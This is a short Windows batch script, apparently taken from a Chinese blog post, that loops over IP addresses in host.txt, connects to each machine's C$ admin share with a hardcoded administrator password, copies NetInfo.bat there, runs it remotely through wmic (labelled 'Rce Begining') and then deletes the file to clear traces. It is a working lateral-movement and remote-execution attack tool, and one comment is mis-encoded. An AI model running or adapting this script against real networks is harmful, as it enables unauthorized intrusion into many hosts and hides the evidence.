:: https://mp.weixin.qq.com/s/ge2JWpHfqruiED-KPyF3Gw
:: host.txt IPµØÖ·
@echo off
for /f "delims=" %%i in (host.txt) do @(
  echo.
  echo %%i Rce Begining ...
  net use \\%%i\c$ /user:"administrator" "admin!@#45" > null
  copy NetInfo.bat \\%%i\c$\users\public\ /y > null
  echo.
  wmic /node:%%i /user:".\administrator" /password:"admin!@#45" PROCESS call create "cmd /c c:/users/public/netinfo.bat"
  ping 127.0.0.1 -n 42 > null
  echo.
  echo.
  del \\%%i\c$\users\public\NetInfo.bat /F
  net use \\%%i\c$ /del  > nul
)